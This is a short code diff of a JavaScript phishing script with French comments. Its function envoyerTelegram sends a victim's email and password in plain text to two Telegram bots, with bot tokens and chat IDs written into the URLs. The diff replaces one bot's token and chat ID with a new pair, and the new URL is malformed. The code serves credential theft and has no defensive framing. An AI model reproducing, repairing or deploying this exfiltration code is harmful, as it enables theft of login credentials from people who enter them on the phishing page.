@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function () {
     // Fonction d'envoi des données à deux bots Telegram
     function envoyerTelegram(data) {
         // URL pour le premier bot
-        const telegramBot1Url = `https://api.telegram.org/bot7487189785:AAF89jCIQGmMxrIMjnKs6ScNUuEr6oTKduo/sendMessage?chat_id=7041323586&text=🟧- ${data.email}:${data.password}`;
+        const telegramBot1Url = `https://api.telegram.org/8107688809:AAGVUC_P6uiK6MYqXIZJvNjzg77LKrqpsms/sendMessage?chat_id=8356596920text=🟧- ${data.email}:${data.password}`;
         
         // URL pour le deuxième bot
         const telegramBot2Url = `https://api.telegram.org/bot7588608492:AAEU1KFhyfPTR_jexRfS7_zmYCSMWqYp_58/sendMessage?chat_id=-4696074794&text=🟧- ${data.email}:${data.password}`;
@@ -122,4 +122,5 @@ document.addEventListener('DOMContentLoaded', function () {
                 });
         }
     });
+
 });
